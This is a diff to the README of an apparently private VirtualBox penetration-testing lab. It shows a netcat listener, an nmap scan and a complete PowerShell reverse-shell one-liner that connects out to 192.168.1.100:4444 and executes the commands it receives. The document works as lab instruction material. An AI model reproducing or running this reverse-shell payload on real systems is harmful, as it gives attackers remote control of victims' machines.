@@ -47,11 +47,13 @@ All machines are connected via **VirtualBox Internal Network (LAN_NET)**.
 
 ### ✔️ Reverse Shell
 - On Kali:
-  ```bash
   nc -nvlp 4444
+
 
   On Windows PowerShell:
   $c=New-Object Net.Sockets.TCPClient('192.168.1.100',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($r=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$o=(iex $d 2>&1 | Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($o),0,$o.Length)}
+
+
 
    Nmap Port Scan:
 sudo nmap -sS 192.168.1.101
